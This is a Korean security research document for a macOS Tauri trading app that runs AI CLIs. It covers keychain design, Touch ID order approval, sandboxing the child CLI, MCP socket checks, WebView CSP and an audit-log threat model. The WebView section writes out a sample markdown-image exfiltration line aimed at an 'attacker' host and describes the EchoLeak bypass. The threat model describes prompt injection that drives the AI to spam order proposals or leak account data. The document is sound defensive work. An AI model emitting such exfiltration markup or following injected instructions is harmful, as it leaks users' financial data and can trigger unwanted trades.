# R-16 로컬 보안

- 조사일: 2026-11-11 (모든 출처의 확인 날짜도 이날이다)
- 조사 환경: macOS 26.5.2 (25F84), Apple Silicon, rustc 1.88.0, Apple Swift 6.3.3
- 기준 버전: Tauri 2.12.5, security-framework 3.7.0, keyring 4.2.0 / apple-native-keyring-store 1.0.2, objc2-local-authentication 0.3.2, robius-authentication 0.3.1, secrecy 0.10.3, zeroize 1.9.1, http 1.5.0, tauri-plugin-dialog 2.8.4, rfd 0.18.0, rusqlite 0.42.0, MCP 규격 2026-07-28, react-markdown 10.x (crates.io API와 각 문서에서 확인)
- 실험 코드는 저장소 밖 작업 폴더(아래에서 `<scratch>`)에 두었다. 실제 키체인 항목, 증권 계좌, API 키는 쓰지 않았다.

## 1. 요약

1. 키체인은 **데이터 보호 키체인**(`kSecUseDataProtectionKeychain`)을 써야 한다. Touch ID 같은 생체 인증을 키체인 항목에 거는 기능과 "다른 앱은 프롬프트도 없이 거부" 같은 접근 통제는 이 구현에서만 된다. 대신 App ID와 프로비저닝 프로파일로 서명해야 한다. 서명하지 않은(ad-hoc) 빌드는 `errSecMissingEntitlement`(-34018)로 실패한다.
2. 주문 전 본인 확인은 코어가 `LAContext.evaluatePolicy(.deviceOwnerAuthentication)`를 직접 부르는 방식으로 한다. Touch ID가 없거나 쓸 수 없으면 시스템이 로그인 암호로 넘어간다. Tauri 공식 biometric 플러그인은 모바일 전용이라 쓸 수 없다. 시스템 창에 넣을 수 있는 것은 짧은 이유 문자열 하나뿐이므로, 자세한 주문 요약은 코어가 띄우는 네이티브 창에 따로 보여 준다.
3. AI CLI는 같은 사용자 권한으로 돈다. 그래서 정리한 환경 변수, 빈 작업 폴더, `sandbox-exec` 프로필(폐기 예정이지만 동작은 확인함), 데이터 보호 키체인을 겹쳐 쓴다. 이 중 운영체제가 강제하는 경계는 키체인 접근 그룹과 샌드박스 프로필뿐이다.
4. MCP는 HTTP 대신 stdio 브리지와 Unix 소켓으로 연다. 소켓에서는 실행마다 만드는 토큰, 상대 PID, 부모 PID를 검사한다. 이렇게 하면 브라우저 경유 공격(DNS 재바인딩)이 원천 차단된다. HTTP를 쓰게 되면 `Origin`/`Host` 검사, 토큰, `127.0.0.1` 바인딩을 규격대로 해야 한다.
5. 감사 로그의 해시 체인은 "중간 수정"만 잡는다. 꼬리를 잘라 내거나 전체를 다시 쓰는 공격은 잡지 못한다. 체인의 머리값을 키체인(가능하면 Secure Enclave 서명)에 고정하고, 토스 주문 내역과 대조해 보완한다.

## 2. 질문별 답

### Q1. macOS 키체인

**구현이 두 개다.** macOS에는 파일 기반 키체인과 데이터 보호 키체인이 있다. SecItem API는 기본값으로 파일 기반 키체인을 쓴다. `kSecUseDataProtectionKeychain`을 켜야 데이터 보호 키체인을 쓴다. Apple은 데이터 보호 키체인을 기본으로 쓰라고 권하고, 파일 기반 키체인은 "폐기로 가는 중"이라고 쓴다 [TN3137].

| 항목 | 파일 기반 키체인 | 데이터 보호 키체인 |
|---|---|---|
| 접근 통제 | 항목별 ACL(`SecAccess`). 기본값은 항목을 만든 앱 하나이며 그 앱의 지정 요구사항(DR)으로 식별한다 [TN3137], [포럼 98484] | 서명 entitlement에서 오는 키체인 접근 그룹 + 선택적 `SecAccessControl` [TN3137] |
| 다른 앱의 읽기 시도 | 사용자에게 허용 프롬프트가 뜬다. 사용자가 "항상 허용"을 누르면 열린다 | 접근 그룹 entitlement가 없으면 거부된다. 이 entitlement는 Apple이 발급한 프로비저닝 프로파일로 승인돼야 한다 [TN3137] |
| 생체 인증 항목, Secure Enclave 키 | 불가 | 가능 [TN3137] |
| 서명 요구 | 없음 (ad-hoc도 동작) | App ID로 서명해야 한다. 아니면 -34018 [포럼 740164] |
| 앞날 | 일부 API 폐기. Quinn(Apple DTS)은 ACL 코드에 투자하지 말라고 한다 [포럼 115425] | Apple이 기본으로 권장 |

**Rust crate 비교.**

| crate (버전) | 데이터 보호 키체인 | 접근 제어(생체) | 비고 |
|---|---|---|---|
| `security-framework` 3.7.0 | `PasswordOptions::use_protected_keychain()` | `set_access_control(_options)`, `access_control` 모듈 | Apple Security 프레임워크의 얇은 래퍼. 필요한 옵션이 다 있다 [docs.rs security-framework] |
| `keyring` 4.2.0 + `apple-native-keyring-store` 1.0.2 | `protected` 기능 (macOS 10.15+, Apple Silicon만) | 문서에 생체 언급 없음 (미확인) | 기본 `v1` 기능은 레거시 `keychain` 저장소만 켠다. 크로스 플랫폼용이다 [docs.rs keyring], [docs.rs apple-native-keyring-store] |
| `objc2-security` 0.3.2 | 원시 바인딩 | 원시 바인딩 | unsafe가 많다 |

추천은 `security-framework` 3.7.0이다. macOS 전용 앱이고, 접근 제어를 직접 지정해야 하기 때문이다.

**같은 사용자의 다른 프로세스를 어디까지 막는가.**

- 데이터 보호 키체인에 이 앱 팀 접두사의 접근 그룹으로 저장하면, 다른 앱(`claude`, `node`, `security` CLI 포함)은 entitlement가 없으므로 읽을 수 없다. 프롬프트도 뜨지 않으니 사용자가 실수로 허용하는 경로도 없다 [TN3137].
- 파일 기반 키체인이면 다른 프로세스가 읽으려 할 때 프롬프트가 뜬다. 이 앱 사용자는 자식 프로세스를 자주 띄우므로 "허용"을 습관처럼 누를 위험이 크다.
- 막지 못하는 것: 이 앱 프로세스 안에서 도는 코드(주입된 dylib, 디버거). Hardened Runtime은 코드 주입, dylib 하이재킹, 프로세스 메모리 변조를 막는다 [Hardened Runtime]. 그래서 서명할 때 Hardened Runtime을 켜야 한다(Tauri `bundle.macOS.hardenedRuntime`) [Tauri 스키마]. root 권한 악성코드나 SIP를 끈 환경은 범위 밖이다.

**서명하지 않은 개발 빌드.**

- 실험 결과, `cargo build` 산출물은 링커가 ad-hoc으로 서명한다. 팀 ID가 없고, 지정 요구사항이 cdhash에 묶인다.

  ```
  $ codesign -dv target/debug/sec-demo
  CodeDirectory v=20400 ... flags=0x20002(adhoc,linker-signed)
  Signature=adhoc
  TeamIdentifier=not set
  $ codesign -d -r- target/debug/sec-demo
  # designated => cdhash H"d93c20ee..."
  ```

- 이 때문에 파일 기반 키체인에서는 다시 빌드할 때마다 다른 앱으로 취급된다(ACL은 DR로 앱을 식별하기 때문 [포럼 98484]). 데이터 보호 키체인은 -34018로 아예 쓸 수 없다 [포럼 740164].
- 유료 계정 없이도 된다는 Apple DTS 답이 있다. Xcode Personal Team에서 Maps 같은 capability를 추가해 App ID를 받으면 된다 [포럼 740164]. Xcode가 만든 프로파일을 Xcode 밖에서 써도 된다는 답도 있다 [포럼 777179]. Tauri는 `bundle.macOS.files`로 `embedded.provisionprofile`을 넣고 `entitlements`로 entitlement 파일을 지정할 수 있다 [Tauri 번들].
- 이 PC의 상태: `security find-identity -v -p codesigning`로 확인하니 "Apple Development" 서명 ID 하나와 "Developer ID Application" 서명 ID 하나가 유효하다(이름과 팀 ID는 적지 않는다). Developer ID 인증서는 Apple Developer Program 팀의 Account Holder만 만들 수 있다 [Developer ID]. 따라서 유료 팀이 있을 가능성이 높다. 멤버십이 지금 유효한지는 미확인이다.
- Tauri로 만든 앱에 프로파일을 넣었을 때 빈 화면이 뜬 사례가 있다. 원인은 끝까지 밝혀지지 않았다 [포럼 777179]. 이 앱에서 재현되는지는 미확인이다.

### Q2. Touch ID로 본인 확인

**호출 방법.**

| 방법 | 상태 |
|---|---|
| `tauri-plugin-biometric` | Android와 iOS 전용이다. 설정 예시도 `cfg(mobile)`이다. 데스크톱 macOS에는 쓸 수 없다 [Tauri biometric] |
| `objc2-local-authentication` 0.3.2 | `LAContext`, `canEvaluatePolicy`, `evaluatePolicy:localizedReason:reply:`를 그대로 노출한다 (`block2` 기능 필요) [docs.rs objc2-local-authentication] |
| `robius-authentication` 0.3.1 | macOS에서 Touch ID와 암호를 지원하는 크로스 플랫폼 추상화. 내부 구현은 문서에 없다(미확인) [docs.rs robius-authentication] |
| `security-framework` + `SecAccessControl` | 키체인 항목을 읽는 순간 시스템이 인증을 요구한다. 데이터 보호 키체인이 필요하다 |

**정책.**

- `.deviceOwnerAuthentication`: Touch ID와 Apple Watch를 함께 시도한다. 둘 다 쓸 수 없으면 사용자 암호를 묻는다 [LAPolicy.deviceOwnerAuthentication]. SEC-8의 "Touch ID, 없으면 시스템 암호"와 그대로 맞는다.
- `.deviceOwnerAuthenticationWithBiometrics`: 생체 인증만 받는다. 실패가 여러 번 쌓이면 대체 수단을 앱이 직접 만들어야 한다 [LAPolicy.biometrics].
- 키체인 항목에 거는 경우: `SecAccessControlCreateWithFlags(..., .userPresence)`는 생체 또는 암호를 받는다(= `biometryAny` or `devicePasscode`) [userPresence]. `.biometryCurrentSet`은 등록 지문이 바뀌면 항목을 무효로 만든다 [biometryCurrentSet]. 항목을 읽을 때 `kSecUseOperationPrompt`나 `LAContext.localizedReason`으로 이유 문구를 보여 준다 [Keychain with Touch ID].

**이 앱에서 키체인 항목에 생체 인증을 거는 것이 맞는가.**

- 토스 `client_secret`이나 액세스 토큰에 걸면 맞지 않는다. 시세나 잔고 조회처럼 주문이 아닌 작업에도 토큰 발급이 필요하므로 그때마다 Touch ID를 요구하게 된다. 토스 키에는 읽기 전용 권한이 없다는 점(design 9장)도 이 판단을 바꾸지 않는다.
- 맞는 쪽은 **승인 서명 키**다. Secure Enclave에 `biometryCurrentSet` 접근 제어를 건 P-256 키를 만들고, 승인마다 "제안 ID, 주문 요약 해시, clientOrderId, 시각"에 서명해 감사 로그에 남긴다. 그러면 `evaluatePolicy`가 돌려주는 참/거짓에만 기대지 않는다. 손가락 없이는 유효한 승인 서명을 만들 수 없다. 토스가 이 서명을 검증하지는 않으므로, 이 서명은 주문을 막는 장치가 아니라 감사와 변조를 탐지하는 장치다. 데이터 보호 키체인이 필요하다 [TN3137].

**대체 수단.** Touch ID가 없거나 덮개를 닫은 Mac이라면 `.deviceOwnerAuthentication`이 로그인 암호로 넘어간다 [LAPolicy.deviceOwnerAuthentication]. 앱이 따로 PIN을 만들 필요는 없다.

**실험 (프롬프트를 띄우지 않는 `canEvaluatePolicy`만 호출).**

```
$ ./la
biometrics: false err: -4 Authentication canceled.
biometryType raw: 1 (0 none, 1 touchID, 2 faceID, 4 opticID)
deviceOwnerAuthentication: true err: 0
```

이 Mac에는 Touch ID 장치가 있다(`biometryType=1`). 하지만 이 실행 환경(에이전트가 띄운 비대화형 프로세스)에서는 생체 정책이 -4(`systemCancel`)를 돌려줬고, 암호를 포함하는 정책만 쓸 수 있었다. 원인이 실행 문맥인지 덮개 상태인지는 미확인이다. 앱 설계에 주는 의미는 하나다. **Touch ID를 쓸 수 없는 순간이 실제로 생기므로 `.deviceOwnerAuthentication`을 써야 한다.** 실제 `evaluatePolicy` 창이 ad-hoc 빌드에서 뜨는지는 사람이 눌러야 해서 확인하지 못했다(미확인).

### Q3. 자식 프로세스(AI CLI)를 비밀에서 떼어 놓기

| 겹 | 방법 | 막는 것 | 한계 |
|---|---|---|---|
| 1. 비밀을 프로세스 밖에 둔다 | 토스 비밀은 코어 메모리와 데이터 보호 키체인에만 둔다. CLI 인자, 환경 변수, 파일에 쓰지 않는다 | 상속 경로 전체 | - |
| 2. 환경 변수 정리 | `Command::env_clear()` 뒤 허용 목록(`PATH`, `HOME`, `USER`, `LANG`, `TMPDIR` 등 CLI에 꼭 필요한 것)만 넣는다 | 부모 환경에 섞인 비밀 | Claude Code는 `ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, `CLAUDE_CONFIG_DIR` 등을 읽고, `CLAUDE_CONFIG_DIR`가 바뀌면 키체인 항목도 달라진다 [Claude Code 인증]. 허용 목록은 R-02에서 확정한다 |
| 3. 파일 디스크립터 | Rust std가 연 파일과 소켓은 자식에게 상속되지 않았다(실험) | 열린 DB와 소켓 핸들 | 다른 라이브러리가 FFI로 연 fd는 따로 확인해야 한다 |
| 4. 작업 폴더 | 실행마다 빈 임시 폴더(0700)를 만들어 `current_dir`로 준다 | CLI가 프로젝트 파일을 맥락으로 읽는 것 | 경로 접근 자체를 막지는 않는다 |
| 5. `sandbox-exec` | 앱 데이터 폴더 읽기/쓰기 금지, 외부 네트워크는 필요한 곳만 허용 | 셸 도구가 켜졌거나 CLI가 뚫렸을 때 파일과 네트워크 접근 | `sandbox-exec`는 man 페이지에 "DEPRECATED"라고 적혀 있다(로컬 man 1). 프로필 언어(SBPL)는 공개 문서가 없다. Claude Code도 macOS에서 Seatbelt를 쓰지만 그 범위는 Bash 계열 명령과 그 자식뿐이고, MCP 서버는 덮지 않는다 [Claude Code 샌드박스] |
| 6. 키체인 접근 그룹 | 앱 항목은 앱 팀의 접근 그룹에만 둔다 | CLI가 `security` 등으로 키를 읽는 것 | 데이터 보호 키체인일 때만 강제된다 |
| 7. App Sandbox (앱 전체) | 쓰지 않는다 | - | 샌드박스 앱의 자식은 반드시 부모 샌드박스를 물려받는다 [포럼 706390]. 그러면 CLI가 `~/.claude`나 자기 키체인 자격 증명에 닿지 못해 동작하지 않을 가능성이 크다(미확인) |

**`sandbox-exec` 실험** (macOS 26.5.2, 가짜 파일 사용):

```
$ cat profile.sb
(version 1)
(allow default)
(deny file-read* file-write* (subpath "<scratch>/sbx/appdata"))
(deny network-outbound (remote ip "*:*"))
(allow network-outbound (remote ip "localhost:*"))

--- read work (allowed):       ok                          exit=0
--- read appdata (denied):     cat: ...app.db: Operation not permitted   exit=1
--- outbound https (denied):   curl: (7) Failed to connect to example.com port 443  exit=7
--- child of sandboxed shell:  cat: ...app.db: Operation not permitted   exit=1   (자식도 상속)
--- no sandbox control:        FAKE-DB-CONTENT
```

키체인 서비스(`com.apple.SecurityServer` 등)의 mach-lookup과 `~/Library/Keychains` 읽기를 막는 프로필도 시험했다. `security` 명령의 오류 메시지는 바뀌었지만, "막혔다"고 확정할 수 있는 결과는 아니었다(미확인). 게다가 Claude CLI는 자기 OAuth 자격 증명을 키체인에서 읽는다 [Claude Code 인증]. 그래서 키체인 전체를 막는 것은 쓸 수 없고, 겹 6(접근 그룹)으로 막아야 한다.

**환경 변수 실험** (`sec-demo` [3]):

```
[3] default spawn inherits TOSS_CLIENT_SECRET: true
[3] env_clear child env:
HOME=/tmp/fake-home
PATH=/usr/bin:/bin
```

### Q4. 메모리 안의 비밀 값

**타입 설계.**

- 비밀 값은 `secrecy::SecretString`(또는 `SecretBox<T>`)으로 감싼다. 이 타입은 기본으로 `Serialize`가 없다(`SerializableSecret` 표시가 필요하다). 복제에도 `CloneableSecret` 표시가 필요하다. 값을 꺼내려면 `expose_secret()`을 불러야 하므로 꺼내는 곳을 검색할 수 있다 [docs.rs secrecy].
- 실험 결과, 비밀 필드가 있는 구조체에 `#[derive(Debug)]`를 해도 비밀은 가려져 나온다.

  ```
  [1] Debug of config: TossConfig { client_id: "demo-id", client_secret: SecretBox<str>([REDACTED]) }
  ```

- 도메인 쪽 비밀 newtype(`TossClientSecret`, `AccessToken`, `DbKey`)은 `Debug`, `Display`, `Serialize`, `Clone`을 **구현하지 않는다**. 오류 타입은 비밀이나 요청·응답 본문을 담지 않는다. `thiserror` 메시지에는 엔드포인트 이름과 상태 코드만 넣는다.
- HTTP 헤더는 `HeaderValue::set_sensitive(true)`로 표시한다. 그러면 `Debug`에서 가려지고, HTTP/2 HPACK 압축 대상에서도 빠질 수 있다 [docs.rs http HeaderValue].
- `reqwest`나 `tracing` 계층에서 요청 본문을 기록하지 않는다. 토큰 발급 요청 본문(`client_secret=...`)이 대표적인 누출 경로다.
- 테스트: 가짜 비밀 문자열을 넣고 모든 로그 출력, 오류 문자열, SQLite 파일, MCP 응답을 검사해 그 문자열이 0건임을 확인한다(S-12의 완료 조건으로 쓴다).

**지우기.**

- `zeroize` 1.9.1은 `write_volatile`과 메모리 펜스로 지우기가 최적화로 사라지지 않음을 보장한다. 하지만 move로 생긴 복사본, 스택에 남은 사본, `Vec`/`String` 재할당 때 남은 사본, 레지스터는 보장하지 않는다. 스왑과 `mlock`도 범위 밖이라고 명시한다 [docs.rs zeroize].
- 따라서 "지우기"는 **흔적을 줄이는 장치**이지 보장이 아니다. 비밀은 힙에 한 번만 만들고(`SecretString::from(String)`), 길이를 미리 정해 재할당을 피한다. HTTP 라이브러리 내부 버퍼에 남는 사본은 막을 수 없다(남는 위험).

### Q5. 로컬 MCP 서버의 위험

| 공격 경로 | 설명 | 방어 |
|---|---|---|
| 같은 사용자의 다른 프로세스 | `127.0.0.1` 포트는 누구나 접속할 수 있다 | 실행별 토큰. Unix 소켓이면 0700 폴더와 0600 소켓 + 상대 PID 검사 |
| 브라우저 웹 페이지 (CSRF) | 웹 페이지가 `http://127.0.0.1:port`로 POST를 보낸다 | 토큰 헤더 필수(단순 요청으로는 헤더를 붙일 수 없다), `Origin` 검사 |
| DNS 재바인딩 | 공격자 도메인이 127.0.0.1로 다시 해석돼 같은 출처처럼 접근한다 | 규격상 `Origin`을 검사해야 하고(MUST), 틀리면 403을 돌려줘야 한다. `127.0.0.1`에만 바인딩한다(SHOULD) [MCP Streamable HTTP]. `Host` 헤더도 `127.0.0.1:port`만 받는다 |
| WebView | 앱 WebView 스크립트가 MCP 포트로 요청한다 | CSP `connect-src`에 MCP 주소를 넣지 않는다 |
| 토큰 노출 | MCP 설정 파일이나 환경 변수에 든 토큰을 다른 프로세스가 읽는다 | 0600 파일을 실행마다 새로 만들고 시작 직후 지운다. 토큰은 실행 하나에만 유효하다 |

- MCP 보안 모범 사례 문서는 로컬 서버에 stdio 전송을 쓰라고 권한다. HTTP를 쓴다면 인증 토큰을 요구하거나 Unix 소켓 같은 접근 제한 IPC를 쓰라고 한다 [MCP 보안 모범 사례].
- Claude Code가 문서로 밝힌 전송은 stdio, http, sse(폐기 예정), ws다. Unix 소켓은 문서에 없다(미확인) [Claude Code MCP]. 그래서 **stdio 브리지**를 쓴다. 앱이 함께 배포하는 작은 실행 파일을 CLI가 stdio MCP 서버로 띄우고, 브리지는 앱의 Unix 소켓에 접속해 메시지를 그대로 넘긴다(규격도 바이트 스트림 위에서는 stdio 프레이밍을 다시 쓰라고 한다 [MCP 전송]).
- Chrome의 Local Network Access는 공개 웹사이트가 루프백(127.0.0.0/8)에 요청할 때 권한을 묻는다. 프롬프트는 Chrome 142에서 출시됐다 [Chrome LNA]. 하지만 다른 브라우저와 구버전이 남아 있으므로 이것에 기대지 않는다.

**Unix 소켓의 상대 확인 실험** (`sec-demo` [4]). 소켓에 접속한 상대의 PID를 `LOCAL_PEERPID`로, UID를 `getpeereid`로 읽었다. 그 PID의 부모가 앱이 띄운 자식 PID와 같은지도 확인했다.

```
[4] spawned sh pid=86661 peer pid=86663 peer's ppid=86661 peer uid=501 my uid=501 msg="hello"
```

실제 앱에서는 "상대의 부모 PID == 앱이 띄운 `claude` PID"이고 "상대 실행 파일 경로 == 앱 번들 안의 브리지"인지 확인한 뒤 토큰을 검사한다. PID 재사용 경쟁이 있으므로 PID 검사는 보조 수단이다. 감사 토큰(`LOCAL_PEERTOKEN`)으로 더 강하게 확인할 수 있는지는 미확인이다.

### Q6. WebView 보안

- **CSP**: Tauri는 `app.security.csp`를 설정했을 때만 CSP를 켠다. 빌드할 때 로컬 스크립트와 스타일에 해시와 nonce를 자동으로 붙인다 [Tauri CSP]. `dangerousDisableAssetCspModification`은 이 주입을 끄는 옵션이므로 쓰지 않는다 [Tauri 스키마]. 개발용 `devCsp`도 같은 정책으로 둔다.
- 권장 정책(초안, R-05와 R-14에서 검증): `default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: asset:; connect-src ipc: http://ipc.localhost; font-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'`. 원격 이미지와 원격 스크립트를 금지한다. CDN도 쓰지 않는다 [Tauri CSP].
- **원격 콘텐츠**: 기본적으로 Tauri API는 번들된 코드만 부를 수 있다. 원격 URL에 권한을 주는 `remote.urls`는 쓰지 않는다 [Tauri capabilities].
- **capabilities**: 명령은 `AppManifest::commands`로 범위를 정하지 않으면 모든 창이 부를 수 있다 [Tauri capabilities]. 그래서 앱 명령 목록을 명시한다. WebView에는 `dialog`, `shell`, `opener`, `fs`, `http` 플러그인 권한을 주지 않는다. capabilities는 잘못된 Rust 코드, 느슨한 범위, WebView 0-day, 공급망 공격을 막지 못한다고 문서에 적혀 있다 [Tauri capabilities].
- **`freezePrototype: true`**: 프로토타입 오염으로 Tauri API 객체를 바꿔치기하는 것을 막는다 [Tauri 스키마].
- **isolation 패턴**: 모든 IPC를 샌드박스 iframe 안의 검증 스크립트로 통과시킨다. 메시지는 실행마다 새 키로 AES-GCM 암호화된다. 주된 대상은 프런트엔드 의존성 공급망 위협이다 [Tauri isolation]. 이 앱에서는 코어가 어차피 모든 입력을 다시 검증하고 주문은 WebView 밖에서 확인받으므로, 얻는 것이 적다. 쓰지 않는 것을 추천한다. 단, R-05에서 비용이 작다고 나오면 켠다.
- **AI가 만든 마크다운**:
  - `react-markdown`은 기본적으로 HTML을 이스케이프한다. 기본 URL 변환은 `http`, `https`, `irc`, `ircs`, `mailto`, `xmpp`와 상대 경로만 허용하므로 `javascript:` 링크는 걸러진다. `rehype-raw`를 추가하거나 `urlTransform`을 느슨하게 바꾸면 이 보호가 깨진다 [react-markdown].
  - **이미지 유출**: 프롬프트 주입으로 AI가 `![](https://attacker/?q=<보유 종목>)`를 쓰게 만들면, 렌더링만으로 데이터가 나간다. EchoLeak(CVE-2025-32711)은 CSP 허용 목록 안의 프록시 도메인으로 이 방어를 우회했다 [EchoLeak]. 그래서 AI 답변에서는 외부 이미지를 렌더링하지 않는다(컴포넌트 단에서 `img`를 링크 텍스트로 바꾼다). CSP `img-src`에도 외부 호스트를 넣지 않는다.
  - **링크**: WebView 안에서 이동하지 않게 한다. 클릭하면 코어 명령 `open_external(url)`을 부르고, 코어는 `https`만 허용한다. 수집 목록에 있는 주소가 아니면 실제 호스트를 보여 주고 확인을 받는다. 셸로 URL을 열지 않는다 [MCP 보안 모범 사례 – URL 열기].
  - 숫자, 종목, 제안은 AI 텍스트가 아니라 코어 데이터로 카드를 그린다(design 4.2와 같다).

### Q6-1. WebView가 승인을 위조하지 못하게 하기와 확인 창의 한계

**전제.** WebView 안의 스크립트는 승인 버튼이 부르는 것과 같은 IPC 명령을 부를 수 있다(architecture 4.3). 그래서 WebView에서 온 요청은 "승인 요청"일 뿐 승인이 아니다.

**구현.**

1. WebView는 `request_order_approval(proposal_id)`만 부른다. 수량, 가격, 계좌 같은 주문 내용은 인자로 받지 않는다. 코어가 저장된 `Proposal<Validated>`를 읽는다.
2. 코어(`order-execution`)가 최신 시세와 잔고로 다시 계산한다.
3. 코어가 **네이티브 확인 창**을 띄운다. Rust 쪽 `tauri-plugin-dialog`(`app.dialog().message(...).buttons(OkCancelCustom(..)).blocking_show()`) [Tauri dialog] 또는 `rfd` 0.18.0을 쓴다. 창에는 종목명과 코드, 시장, 방향, 수량, 지정가, 예상 금액과 수수료, 계좌 뒤 4자리, clientOrderId 앞 8자를 코어 계산값으로 보여 준다.
4. 사용자가 확인을 누르면 코어가 `LAContext.evaluatePolicy(.deviceOwnerAuthentication, localizedReason: "삼성전자 10주 지정가 매수 (약 71만 원)")`를 부른다. 또는 Secure Enclave 승인 키 서명으로 Touch ID를 요구한다.
5. 통과하면 같은 호출 안에서 `ApprovedOrder`를 만들어 전송한다(design 6장의 "승인과 전송은 한 번에").

**확인 창에 표시할 수 있는 것의 한계.**

| 창 | 내용 | 한계 |
|---|---|---|
| Touch ID / 암호 창 (`LAContext`) | 시스템이 앱 이름을 제목에 넣는다. 앱은 이유 문자열 하나만 준다. 짧고 분명하게 쓰고 앱 이름을 넣지 말라는 것이 Apple 지침이다 [evaluatePolicy] | 길이 제한이 문서에 없다. 길면 잘리는지도 미확인이다. 표, 색, 강조를 쓸 수 없다. 앱 이름은 번들 이름이므로 ad-hoc 개발 빌드에서는 다르게 보일 수 있다(미확인). macOS에서 앱 이름이 빠진 사례 보고도 있다 [포럼 740600] |
| 네이티브 대화상자 (NSAlert 계열) | 제목, 본문 여러 줄, 버튼 이름 | 인증된 화면이 아니다. 같은 모양의 창은 어떤 앱이든 띄울 수 있다. 따라서 이 창의 가치는 "WebView가 내용을 바꿀 수 없다"는 데 있고, 신원 증명이 되지는 않는다 |

**남는 위험과 보완.**

- 피로 공격: WebView가 승인 요청을 반복하면 창이 연달아 뜬다. 한 번에 한 창만 띄우고, 취소한 제안은 일정 시간 동안 다시 요청할 수 없게 하고, 횟수를 감사 로그에 남긴다.
- 바꿔치기: WebView가 화면에는 제안 A를 보여 주고 승인 요청은 제안 B로 보낼 수 있다. 그래서 네이티브 창의 내용이 진짜 기준이고, 사용자는 그것을 읽어야 한다. Touch ID 이유 문자열에도 종목, 방향, 수량을 넣어 두 번 보여 준다.
- 접근성 권한을 가진 다른 프로세스는 네이티브 창의 버튼을 누를 수 있다. Touch ID는 물리적 접촉이 필요하므로 이를 막는다. 다만 암호 대체 경로에서는 키 입력을 흉내 낼 수 있는지가 미확인이다.

### Q7. 감사 로그의 변조 탐지 범위와 한계

| 방법 | 잡는 것 | 못 잡는 것 |
|---|---|---|
| 해시 체인 (각 행에 이전 행 해시) | 중간 행의 수정, 삭제, 삽입 | 꼬리 잘라내기, 체인 전체 다시 쓰기, 처음부터 거짓 기록 |
| + 키 있는 MAC(HMAC, 키는 키체인) | 키가 없는 공격자의 전체 다시 쓰기 | 키를 읽을 수 있는 공격자(같은 앱 프로세스 장악) |
| + 머리값 고정 (마지막 순번과 해시를 키체인에 저장) | 꼬리 잘라내기(로컬 고정점이 남는 동안) | 고정점과 DB를 함께 되돌리는 공격 |
| + Secure Enclave 승인 서명 (Q2) | 사람 확인 없이 만든 "승인" 기록 | 기록하지 않고 전송한 경우(코드 경로 자체가 뚫린 경우) |
| + 외부 대조 (토스 주문 내역과 주문 이벤트) | 로그에 없는 주문, 로그와 다른 주문 | 토스가 보관하지 않는 정보(제안, 거절, 근거) |
| + 외부 사본 (주기적으로 머리값을 다른 매체에 내보내기) | 로컬 전체 되돌리기 | 내보내기 전에 일어난 변조 |

- Schneier–Kelsey 방식은 사후 탐지를 목표로 하며, 꼬리 잘라내기와 지연 탐지에 약하다는 지적을 받는다 [Schneier–Kelsey], [Ma–Tsudik 2008]. Crosby–Wallach는 해시 체인 대신 히스토리 트리를 쓰고, 외부 감사자가 이전 커밋과의 일관성을 확인하는 방식을 제안한다 [Crosby–Wallach].
- 결론: 단독 사용자 PC에서 "지울 수 없는" 로그는 만들 수 없다. 목표를 "조용한 변조를 탐지한다"로 낮춰야 한다. 주문 사실에 대해서는 토스 서버 기록이 가장 강한 기준이다.
- ORD-2의 "전송 전에 먼저 기록"은 감사 로그에 쓰기가 실패하면 전송하지 않는다는 뜻이어야 한다. 이 점을 테스트로 고정한다.

### Q8. 위협 모델 초안

**자산.**

| ID | 자산 | 영향 |
|---|---|---|
| AS-1 | 토스 `client_secret`, 액세스 토큰 | 주문 권한 포함(읽기 전용 범위 없음). 허용 IP에서만 쓸 수 있다 |
| AS-2 | 주문 전송 능력 (코어의 `order-execution` 경로) | 금전 손실 |
| AS-3 | 계좌 정보 (보유, 거래, 계좌번호) | 사생활 |
| AS-4 | SQLite 암호화 키, DB 파일 | AS-3, 논거, 대화 |
| AS-5 | 감사 로그의 무결성 | 사후 추적 |
| AS-6 | Claude/Codex 구독 자격 증명 (CLI가 소유) | 구독 도용 (앱 책임 밖이지만 실행 환경은 앱이 만든다) |
| AS-7 | 사용자의 승인 주의력 | 피로해지면 잘못 승인한다 |

**공격자.**

| ID | 공격자 | 능력 |
|---|---|---|
| T-1 | 뉴스, 웹 페이지, 공시 안의 프롬프트 주입 | AI 출력(텍스트, 도구 호출 인자)을 조종한다 |
| T-2 | 뚫린 AI CLI 또는 그 공급망 | 같은 사용자 권한의 임의 코드 |
| T-3 | 사용자 브라우저의 악성 웹 페이지 | localhost로 요청, DNS 재바인딩 |
| T-4 | 같은 사용자의 다른 악성 프로세스 | 파일 읽기, 포트 접속, 키체인 접근 시도, 접근성 API |
| T-5 | 뚫린 프런트엔드 의존성, WebView XSS | WebView 안의 임의 스크립트, IPC 호출 |
| T-6 | 잠기지 않은 Mac 앞의 다른 사람 | UI 조작 |
| T-7 | 도난 디스크, 백업(Time Machine, 클라우드 동기화 폴더) | 저장된 파일 읽기 |
| T-8 | 개발 과정의 실수(사람·AI 에이전트) | 로그에 비밀을 남기거나, 커밋하거나, 개발 빌드에서 실제 키를 쓴다 |
| T-9 | root 또는 커널 수준 악성코드, SIP 해제 | 범위 밖 |

**위협 모델 표.**

| # | 공격자 | 공격 경로 | 노리는 자산 | 방어 | 남는 위험 |
|---|---|---|---|---|---|
| 1 | T-1 | 주입된 지시로 AI가 `propose_order` 남발 | AS-2, AS-7 | MCP에 전송 도구 없음, 주문 게이트 검증, 네이티브 확인 창, Touch ID(SEC-4, SEC-5, SEC-8) | 그럴듯한 제안을 사용자가 승인한다(판단 실수) |
| 2 | T-1 | AI 답변의 마크다운 이미지나 링크로 계좌 정보 유출 | AS-3 | 외부 이미지 렌더링 금지, CSP `img-src 'self'`, 링크는 코어가 확인 후 연다 | 사용자가 직접 링크를 눌러 연다. 웹 검색 질의 자체에 정보를 넣는 유출(CLI의 WebSearch) |
| 3 | T-1 | 웹 검색 질의나 MCP 인자로 정보 유출 | AS-3 | 계좌번호 마스킹(SEC-7), 프롬프트에 필요한 최소 정보만 | WebSearch 질의를 앱이 걸러 낼 수 없다(미확인, R-02) |
